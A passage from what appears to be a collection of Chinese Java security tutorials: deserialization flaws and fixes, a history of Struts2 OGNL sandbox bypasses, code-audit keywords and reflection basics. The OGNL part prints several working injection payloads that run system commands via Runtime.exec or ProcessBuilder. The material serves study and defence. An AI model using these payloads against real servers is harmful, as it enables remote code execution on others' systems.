通过反射的方法调用传入tranform方法中的inuput对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）\n>\n> **3.ConstantTransformer：**返回成员变量iConstant的值。\n>\n> **4.InstantiateTransformer：**通过反射的方法返回传入参数input的实力。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）\n\n## 三大Map的作用\n\n> **1.lazyMap：**通过调用lazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。\n>\n> **2.TiedMapEntry：**通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和lazyMap配合使用。\n>\n> **3.HashMap：**通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。\n\n## 五大反序列化利用基类\n\n> **1.AnnotationInvocationHandler：**反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。\n>\n> **2.PriorityQueue：**反序列化的时候会调用TransformingComparator中的transformer的tranform方法，用来直接和Tranformer配合使用。\n>\n> **3.BadAttributeValueExpException：**反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。\n>\n> **4.HashSet：**反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。\n>\n> **5.Hashtable：**当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和lazyMap配合使用。\n\n\n\n**参考：**\n\nhttp://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/\n\nhttp://www.vuln.cn/6295\n\nhttps://www.freebuf.com/articles/web/214096.html\n\n[https://badcode.cc/2018/03/15/Java反序列化之Commons-Collections/](https://badcode.cc/2018/03/15/Java反序列化之Commons-Collections/)\n\n","tags":["反序列化","CommonsCollections","gadget"],"categories":["JAVA安全教程"]},{"title":"JAVA反序列化漏洞总结","url":"/2019/02/15/JAVA反序列化漏洞总结/","content":"本文本人首发自https://www.secpulse.com/archives/95012.html\n\n## 前言\n\n### 什么是序列化和反序列化\n\nJava 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。反序列化就是通过序列化后的字段还原成这个对象本身。但标识不被序列化的字段是不会被还原的。\n\n\n\n### 序列化有什么用\n\n1）网站相应的session对象存储在硬盘上，那么保存在session中的内容就必须实现相关的序列化操作。\n\n2）如果使用的java对象要在分布式中使用或者在rmi远程调用的网络中使用的话，那么相关的对象必须实现java序列化接口。\n\n \n\n## Java反序列化类型\n\n我们最常见就是原生的java反序列化类型，其实java中有几种方式可以执行反序列化，本文目的也是对这几种类型的反序列化方法进行归纳和总结。\n\n### 1、 Java原生序列化\n\nJava包中自带的类InputStream和OutputStream，它们之间可以互相转化，使用writeObject序列化，使用readObject反序列化。\n\n```java\nimport java.io.*;\n \npublic class DeserializeDemo\n{\n   public static void main(String [] args)\n   {\n      Employee e = null;\n      try\n      {\n         FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\");\n         ObjectInputStream in = new ObjectInputStream(fileIn);\n         e = (Employee) in.readObject();\n         in.close();\n         fileIn.close();\n      }catch(IOException i)\n      {\n         i.printStackTrace();\n         return;\n      }catch(ClassNotFoundException c)\n      {\n         System.out.println(\"Employee class not found\");\n         c.printStackTrace();\n         return;\n      }\n      System.out.println(\"Deserialized Employee...\");\n      System.out.println(\"Name: \" + e.name);\n      System.out.println(\"Address: \" + e.address);\n      System.out.println(\"SSN: \" + e.SSN);\n      System.out.println(\"Number: \" + e.number);\n    }\n}\n```\n\n### 2、 Json反序列化\n\nJson序列化一般会使用jackson包，通过ObjectMapper类来进行一些操作，比如将对象转化为byte数组或者将json串转化为对象。\n\n```java\npublic static <T> String serialize(T t) throws JsonProcessingException {\n        ObjectMapper mapper = new ObjectMapper();\n        String jsonResult = mapper.writerWithDefaultPrettyPrinter()\n                .writeValueAsString(t);\n        return jsonResult;\n    }\n```\n\n### 3、 Fastjson反序列化\n\nFastjson是一个性能很好的Java语言实现的Json解析器和生成器，由来自阿里巴巴的工程师开发。具有极快的性能，超越任何其他的Java Json Parser。Fastjson使用parseObject来进行反序列化。\n\n```java\nimport com.alibaba.fastjson.JSON;    \n  \npublic class Person {  \n    int age;  \n    String name;  \n    public int getAge() {  \n        return age;  \n    }  \n    public void setAge(int age) {  \n        this.age = age;  \n    }  \n    public String getName() {  \n        return name;  \n    }  \n    public void setName(String name) {  \n        this.name = name;  \n    }  \n    public static void main(String[] args) {  \n        String jsonString=\"{\\\"name\\\":\\\"hah\\\",\\\"age\\\":1}\";  \n        Person person = JSON.parseObject(jsonString, Person.class);  \n        System.out.println(1);  \n    }  \n}  \n```\n\n### 4、Protobuf 反序列化\n\nProtocol Buffers 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。目前提供了 C++、Java、Python 三种语言的 API。\n\n**proto.proto文件内容**\n\n```java\npackage proto;\n\nmessage TestMsg{\n    optional string id = 1;\n    optional string name = 2;\n}\n```\n\n**序列化**\n\n```java\npublic byte[] build(){\n    Proto.TestMsg.Builder builder = Proto.TestMsg.newBuilder();\n    builder.setId(\"ID的值\");\n    builder.setName(\"Name的值\");\n    Proto.TestMsg msg = builder.build();\n\n    return msg.toByteArray();\n}\n```\n\n**反序列化**\n\n```java\nProto.TestMsg msg = Proto.TestMsg.parseFrom(message.returnByte());\nSystem.out.Println(msg);\n```\n\n \n\n## 各方式反序列化比较\n\n![img](/images/a6/1.png)\n\n \n\n## 各序列化漏洞简介\n\n除了使用protobuf进行反序列化没有出现过漏洞，其他方式的序列化都曾出现过漏洞。下面将简单介绍下漏洞，详细的漏洞和exp构造方法大家可以去网上搜索关键字查看（java几个反序列化漏洞exp构造过程都十分精彩，推荐大家认真阅读下）\n\n### 1、Object Serialize 漏洞\n\nApache Commons Collections中实现了TransformedMap ，该类可以在一个元素被添加/删除/或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换。\n\n![img](/images/a6/2.png)\n\nTransformedMap.decorate方法，预期是对Map类的数据结构进行转化，该方法有三个参数。\n\n- 第一个参数为待转化的Map对象\n- 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）\n- 第三个参数为Map对象内的value要经过的转化方法\n\n通过对第三个参数通过构造ChainedTransformer链，通过一系列变化，最终执行系统命令。\n\n### 2、Jackson-databind 漏洞\n\nJackson是一套开源的java序列化与反序列化工具框架，可将java对象序列化为xml和json格式的字符串及提供对应的反序列化过程。由于其解析效率较高，目前是Spring MVC中内置使用的解析方式，该漏洞的触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞，导致可执行任意命令。\n\n### 3、FastJson 漏洞\n\nfastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中有一个私有属性_bytecodes，其部分方法会执行这个值中包含的Java字节码。通过注入恶意代码到_bytecode，导致任意代码执行漏洞。\n\n**注：**Fastjson和Jackson Payload构造的方式都一样，虽然解析函数不一样，但是都是将json转为object，过程是类似的。\n\n\n\n## 防止反序列化漏洞\n\n### 1、Java Serialization\n\n- jdk里增加了一个filter机制 [http://openjdk.java.net/jeps/290 ](http://openjdk.java.net/jeps/290 )，这个一开始是出现在jdk9上的，后面移值回jdk6/7/8上，如果安装的jdk版本是比较新的，可以找到相关的类\n- Oracle打算废除java序列化：https://www.infoworld.com/article/3275924/java/oracle-plans-to-dump-risky-java-serialization.html\n\n### 2、jackson-databind\n\n- jackson-databind里是过滤掉一些已知的类，参见[SubTypeValidator.java](https://github.com/FasterXML/jackson-databind/blob/jackson-databind-2.9.6/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)\n- jackson-databind的[CVE issue列表](https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+label%3ACVE+is%3Aclosed)\n\n### 3、fastjson\n\n- fastjson通过一个denyList来过滤掉一些危险类的package，参见[ParserConfig.java](https://github.com/alibaba/fastjson/blob/1.2.7.sec01/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L169)\n- fastjson在新版本里denyList改为通过hashcode来隐藏掉package信息，但通过这个[DenyTest5](https://github.com/alibaba/fastjson/blob/1.2.47/src/test/java/com/alibaba/json/bvt/parser/deser/deny/DenyTest5.java)可以知道还是过滤掉常见危险类的package\n- fastjson在新版本里默认把autoType的功能禁止掉了\n\n**这些序列化漏洞的根本原因是：没有控制序列化的类型范围。**\n\n仔细看的读者会发现并没有提及protobuf的反序列化漏洞，为什么在protobuf里并没有这些反序列化问题？\n\n- protobuf在IDL里定义好了package范围\n- protobuf的代码都是自动生成的，怎么处理二进制数据都是固定的\n\nprotobuf把一切都框住了，少了灵活性，自然就少漏洞。\n\n**注：**IDL（Interface description language）文件：参与通讯的各方需要对通讯的内容需要做相关的约定（Specifications）。为了建立一个与语言和平台无关的约定，这个约定需要采用与具体开发语言、平台无关的语言来进行描述。这种语言被称为接口描述语言（IDL），采用IDL撰写的协议约定称之为IDL文件。\n\n\n\n## 总结：\n\n本文总结了java反序列化的几种方式，并回顾了java几个经典的漏洞以及对应的修复方案，希望通过本文，大家对java反序列化漏洞有更深刻的认知。\n\n \n\n**参考链接：**\n\nhttp://hengyunabc.github.io/thinking-about-grpc-protobuf/\n\nhttps://blog.csdn.net/u011721501/article/details/78555246\n\nhttps://www.freebuf.com/sectool/165655.html\n\nhttps://www.cnblogs.com/he1m4n6a/p/10131566.html\n\n[https://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/](https://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/)\n\nhttps://www.jianshu.com/p/e9e631285cb0","tags":["JAVA","反序列化"],"categories":["JAVA安全教程"]},{"title":"OGNL攻防史","url":"/2019/02/13/OGNL攻防史/","content":"# 前言\n\n之前基础篇对struts2的框架做了介绍，本篇章将对struts2的原理做个简介。目前struts2已经被阿里巴巴等大厂弃用了，但是作为曾经风靡一时的框架，并且互联网上还有大量的struts2应用，是很有必要学习一番的。\n\n# OGNL表达式\n\nOGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。\n\n## OGNL三要素\n\n**Expression(表达式)：**\n\nExpression规定OGNL**要做什么**，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。\n\n**Root(根对象)：**\n\nOGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对**谁进行操作**。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。\n\n**Context(上下文)：**\n\n有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。**单说就是上下文将规定OGNL的操作在哪里进行。**OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。\n\nOGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：\n\n![](/images/a5/1.png)\n\nsetValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:\n\n![](/images/a5/2.png)\n\n## OGNL基本操作\n\n1. 支持对象方法调用，形式如：objName.methodName()；\n\n2. 支持类静态的方法调用和值访问，表达式的格式为 **@[类全名（包括包路）]@[方法名 | 值名]**，例如：\n\n```java\n@java.lang.String@add（ '11' , 'hahhaha' ）\n```\n\n3. 支持赋值操作和表达式串联，例如：\n\n```java\nnumber=18, price=100,Total()；\n```\n\n那么返回1800；\n\n4. 访问OGNL上下文（OGNL context）其实就是Map （教室、老师、学生）和ActionContext，\n\n   - OgnlContext=根对象(1)+非根对象(N)\n\n     - 老师：根对象 1\n\n     - 学生：非根对象 n\n\n       非根对象要通过**#key**访问，根对象可以省略**#key**\n\n   - **根对象和非根对象的概括**\n\n     - 一个上下文中只有一个根对象\n     - 取跟对象的值，只需要直接通过根对象属性即可\n     - 非根对象取值必须通过指定的上下文容器中的**#key**属性去取。\n\n# OGNL历史\n\nOgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。\n\n以下图例左边都是较为新的版本，右边为老版本。\n\n## Struts 2.3.14.1版本前\n\nS2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：\n\n![](/images/a5/3.png)\n\n左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改allowStaticMethodAccess=true，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：\n\n```java\n(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘calc’))\n```\n\n而在2.3.14.1版本后将allowStaticMethodAccess设置成**final属性**后，就不能显式更改了，这样的poc显然也失效了。\n\n## Struts 2.3.20版本前\n\n在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：\n\n```java\n(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())\n```\n\n直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用ProcessBuilder这个payload了。\n\n## Struts 2.3.29版本前\n\n左为2.3.29版本，右边为2.3.28版本\n\n![](/images/a5/4.png)\n\n从黑名单中可以看到禁止使用了ognl.MemberAccess和ognl.DefaultMemberAccess，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用_memberAccess调用静态对象DefaultMemberAccess，然后用DefaultMemberAccess覆盖_memberAccess。那么为什么说这样就可以使用静态方法了呢？ 我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：\n\n```java\n(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n我们来看一下ognl.OgnlContext@DEFAULT_MEMBER_ACCESS：\n\n![](https://p5.ssl.qhimg.com/t01ecfd1c68ebe3f988.jpg)\n\n看过上一节的都知道，在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess，而这就是创建_memberAccess的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容，就相当于初始化了_memberAccess，这样就可以绕过其之前所设置的黑名单以及限制条件。\n\n## Struts 2.3.30+/2.5.2+\n\n到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：\n\n```java\n(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))\n```\n\n可以看到绕过的关键点在于：\n\n- 利用Ognl执行流程利用container获取了OgnlUtil实例\n- 清空了OgnlUtil$excludedClasses黑名单，释放了DefaultMemberAccess\n- 利用setMemberAccess覆盖\n\n而具体的流程可以参考2.2的内容。\n\n## Struts 2.5.16\n\n分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：\n\n- 2.5.13版本后禁止访问coontext.map\n\n- 准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：\n- ![](/images/a5/6.png)\n- 而这个改变是在OgnlContext中：\n- ![](/images/a5/7.png)\n- 不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对context.map的访问。\n\n- 2.5.20版本后excludedClasses不可变了，具体的代码在[这里](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)\n\n所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。\n\n文章提出了这么一种思路:\n\n- 没有办法使用context.map，可以调用attr，前文说过attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map。\n- 没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空\n- 清空了黑名单，我们就可以利用DefaultMemberAccess来覆盖_memberAccess，来执行静态方法了。\n\n而这里又会出现一个问题，当我们使用OgnlUtil的setExcludedClasses和setExcludedPackageNames将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说_memberAccess是源数据的一个引用，就像前文所说的，在每次createAction时都是通过setOgnlUtil利用全局的源数据创建一个引用，这个引用就是一个MemberAccess对象，也就是_memberAccess。所以这里只会影响这次请求的OgnlUtil而并未重新创建一个新的_memberAccess对象，所以旧的_memberAccess对象仍未改变。\n\n而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的OgnlUitl作为源重新创建一个_memberAccess，这样在第二次请求中_memberAccess就是黑名单被置空的情况，这个时候就释放了DefaultMemberAccess，就可以进行正常的覆盖以及执行静态方法。\n\npoc为：\n\n```java\n(#context=#attr[‘struts.valueStack’].context).(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(”)).(#ognlUtil.setExcludedPackageNames(”))\n\n(#context=#attr[‘struts.valueStack’].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘curl 127.0.0.1:9001’))\n```\n\n# 现阶段的OGNL\n\nStruts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。\n\n## 2.5.17的改变（限制命名空间）\n\n1. 黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.\n<img src=\"/images/a5/8.png\" style=\"zoom:50%;\" />\n- 讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了com.opensymphony.xwork2.ognl.也就是说我们根本没办法访问这个Struts2重写的ognl包了。\n\n2. 切断了动态引用的方式，需要利用构造函数生成\n![](/images/a5/9.png)\n- 不谈重写了setExcludedClasses和setExcludedPackageNamePatterns，单单黑名单的改进就极大的限制了利用。\n\n## 2.5.19的改进\n\n1. ognl包的升级，从3.1.15升级到3.1.21\n![](/images/a5/10.png)\n\n2. 黑名单改进\n![](/images/a5/11.png)\n\n3. 在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：\n\n<img src=\"/images/a5/12.png\" style=\"zoom:50%;\" />\n<img src=\"/images/a5/13.png\" style=\"zoom:50%;\" />\n\n也就是说没有办法显式调用setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames了。\n\n## master分支的改变\n\n1. ognl包的升级，从3.1.21升级到3.2.10，直接删除了DefaultMemberAccess.java，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且_memberAccess变成了final：\n\n<img src=\"/images/a5/14.png\" style=\"zoom:50%;\" />\n<img src=\"/images/a5/15.png\" style=\"zoom:50%;\" />\n\n2. SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：\n<img src=\"/images/a5/16.png\" style=\"zoom:50%;\" />\n\n可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，DefaultAccess彻底退出了历史舞台意味着利用父类覆盖_memberAccess的利用方式已经无法使用，而黑名单对于com.opensymphony.xwork2.ognl的限制导致我们基本上没有办法利用Ognl本身的API来更改黑名单，同时_memberAccess变为final属性也使得S2-057的这种利用_memberAccess暂时性的特征而进行“重放攻击”的方式测地化为泡影。\n\n\n\n参考：\n\nhttps://blog.csdn.net/pngyul/article/details/82723719\n\nhttps://www.anquanke.com/post/id/169735#h3-4\n\nhttps://www.cnblogs.com/huangting/p/11105051.html","tags":["OGNL","Struts2"],"categories":["JAVA安全教程"]},{"title":"JAVA常见WEB漏洞审计","url":"/2019/02/02/JAVA常见WEB漏洞审计/","content":"# 简介\n\n本篇将介绍java web的内容，其实sql，xss等多数漏洞和其他的语言类似，所以不对具体的漏洞原理做分析，本文主要就是对审计关键字的提炼。学习java web具体代码程序的触发过程，不仅可以加深对漏洞的理解，如果你需要从事代码审计等工作，都会有很大的帮助。详细的代码可参考：https://github.com/JoyChou93/java-sec-code。\n\n# SQL漏洞\n\njava产生的漏洞形式主要有两种：\n\n1. 和其他语言一样，通过拼接字符串导致sql\n\n2. 使用myhabits数据库时，用${}拼接了字符串\n\n   ![](/images/a4/1.png)\n\n**审计：**\n\n1. 查看配置文件确定使用的数据库有哪些\n2. 查看所有的controller，看是存在数据库操作的动作\n3. 查看mapper，看是否使用了字符串拼接或者${}\n4. 上述都不管用的时候，直接搜select *等关键字，看具体数据库怎么操作的\n\n# XSS漏洞\n\n这个和其他语言都一样。\n\n**审计：**\n\n1. 查看所有的controller，看返回是否有把未过滤的字符返回给前端\n\n# 命令注入\n\n主要有下面两种两种方法\n\n```java\nRuntime.getRuntime().exec(cmds);\nnew ProcessBuilder(cmds).start();\n```\n\n**审计：**\n\n1. 全局搜索关键字 getRuntime.exec( 和 ProcessBuilder().start\n\n# SSIT\n\njava模板注入，主要是由两个组件velocity和freemarker产生的。\n\n**审计：**\n\n1. 可以查看pom.xml中是否使用了上述两种组件\n2. 全局搜关键字 new VelocityContext( 和 new StringTemplateLoader( \n\n# 重定向漏洞\n\n主要有三种：\n\n1. redirect(@RequestParam(\"url\")\n2. response.setHeader(\"Location\", url);\n3. response.sendRedirect(url); \n\n**审计：**\n\n1. 全局搜索上面三个函数 redirect(, reponse.setHeader(, response.sendRedirect\n\n# 目录穿越漏洞\n\n查看所有controller查找文件相关的操作。\n\n**审计：**\n\n1. 查找 new File( 等关键字\n\n# SSRF漏洞\n\n查看所有controller操作url相关的函数，查找如下一些关键字。\n\n**审计**：\n\n1. new URL(\n2. urlConnection.getInputStream(\n3. HttpURLConnection\n4. Request.Get(\n5. .openStream(\n\n# 文件上传漏洞\n\n查看所有controller有关上传操作的函数，查找如下一些关键字\n\n**审计：**\n\n1. .getOriginalFilename(\n2. .write(\n3. new File(\n\n# XXE漏洞\n\njava解析xml的格式比较多，整理如下关键字\n\n**审计：**\n\n1. XMLReaderFactory.createXMLReader\n2. new SAXBuilder(\n3. new SAXReader(\n4. SAXParserFactory.newInstance(\n5. new Digester(\n6. DocumentBuilderFactory.newInstance(\n","tags":["JAVA","web漏洞","代码审计"],"categories":["JAVA安全教程"]},{"title":"JAVA反射与动态代理","url":"/2019/01/28/JAVA反射与动态代理/","content":"# JAVA反射\n\n## 什么是Java反射\n\n反射是Java的特征之一，是一种**间接操作目标对象的机制**，核心是JVM在运行的时候才动态加载类，并且对于任意一个类，都能够知道这个类的所有属性和方法，调用方法/访问属性，不需要提前在编译期知道运行的对象是谁，他允许运行中的Java程序获取类的信息，并且可以操作类或对象内部属性。程序中对象的类型一般都是在编译期就确定下来的，而当我们的程序在运行时，可能需要动态的加载一些类，这些类因为之前用不到，所以没有加载到jvm，这时，使用Java反射机制可以在**运行期动态的创建对象并调用其属性**，它是在运行时根据需要才加载。\n<!-- more -->\n## 反射的原理\n\n![](/images/a2/1.png)\n\n## 反射的优缺点\n\n**优点：**使用反射，我们就可以在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。\n\n**缺点：**\n\n1. 反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；\n2. 反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。\n\n## 反射的用途\n\n1. 反编译：.class-->.java\n2. 通过反射机制访问java对象的属性，方法，构造方法等\n3. 当我们在使用IDEA时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。\n4. 反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。\n\n## 反射机制常用的类\n\n```Java\nJava.lang.reflect.Constructor;\nJava.lang.reflect.Field;\nJava.lang.reflect.Method;\nJava.lang.reflect.Modifier;\n```\n\n## 反射的基本使用\n\n- Object.getclass()   //需要创建对象\n\n- Object.class    //需要导入对应的类包\n\n- Class.forName    //最常用\n\n**代码实例：**\n\n1、创建一个需要被反射的测试类\n\n```java\nimport static java.lang.System.out;\nimport java.lang.String;\n\npublic class User {\n    private String username;\n    public String interest;\n\n    public User() {\n        ;\n    }\n\n    private User(String name) {\n        System.out.println(\"init.\");\n    }\n\n    public String getUsername(){\n        return username;\n    }\n\n    public void setUsername(String username){\n        this.username = username;\n    }\n\n    public String getInterest(){\n        return interest;\n    }\n\n    public void setInterest(String interest){\n        this.interest = interest;\n    }\n\n    public static void main(String args[]) {\n        User userinfo = new User();\n        userinfo.setUsername(\"xiaoming\");\n        out.println(userinfo.getUsername());\n    }\n}\n```\n\n2、反射调用User类\n\n```java\nimport java.lang.reflect.*;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.System;\nimport java.lang.String;\n\npublic class Reflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n        Class clazz = Class.forName(\"User\"); //包路径，这里测试写在同目录\n\n        System.out.println(\"===获取公共的构造函数===\");\n        Constructor[] constructors = clazz.getConstructors();\n        for (Constructor constructor: constructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取所有的构造函数===\");\n        Constructor[] declaredConstructors = clazz.getDeclaredConstructors();\n        for (Constructor constructor: declaredConstructors)\n            System.out.println(constructor);\n\n        System.out.println(\"===获取公共的属性===\");\n        Field[] fields = clazz.getFields();\n        for (Field field: fields)\n            System.out.println(field);\n\n        System.out.println(\"===获取所有的属性===\");\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field: declaredFields)\n            System.out.println(\"ALL: \" + field);\n        \n        System.out.println(\"===获取特定的函数===\");\n        Method method = clazz.getDeclaredMethod(\"setUsername\", String.class);\n        System.out.println(method);\n\n        //赋值操作\n        Object obj = clazz.getConstructor().newInstance();\n        Object invoke = method.invoke(obj, new String[]{\"我是科比\"});\n\n        System.out.println(\"===测试===\");\n        String name= (String) clazz.getDeclaredMethod(\"getUsername\").invoke(obj);\n        System.out.println(name);\n    }\n}\n```\n\n![](/images/a2/2.png)\n\n这个只做了部分的测试，get\\_系列方法的是获取公用，getDeclared\\_系列方法获取所有，get_(参数)系列获取特定的。如果需要查看所有的方法，可以查看官方文档，或者IDEA跟进Class.java文件查看。这边需要注意的是 method.invoke(obj, args) ，**如果method是静态方法，obj是可以省略的。**\n\n# JAVA动态代理\n\n## 代理模式简介\n\n代理模式是一种常用的设计模式。代理模式为其对象提供了一种代理以控制对这个对象的访问。代理模式可以将主要业务与次要业务进行松耦合的组装。根据代理类的创建时机和创建方式的不同，可以将其分为静态代理和动态代理两种形式：\n\n- 在程序运行前就已经存在的编译好的代理类是为静态代理，\n- 在程序运行期间根据需要动态创建代理类及其实例来完成具体的功能是为动态代理。\n\n## 动态代理简介\n\n对代理模式而言，一般来说，具体主题类与其代理类是一一对应的，这也是静态代理的特点。但是，也存在这样的情况：有N个主题类，但是代理类中的“预处理、后处理”都是相同的，仅仅是调用主题不同。那么，若采用静态代理，必然需要手动创建N个代理类，这显然让人相当不爽。动态代理则可以简单地为各个主题类分别生成代理类，**共享“预处理，后处理”功能**，这样可以大大减小程序规模，这也是动态代理的一大亮点。\n\n在动态代理中，代理类是在运行时期生成的。因此，相比静态代理，动态代理可以很方便地对委托类的相关方法进行统一增强处理，如添加方法调用次数、添加日志功能等等。\n\n### 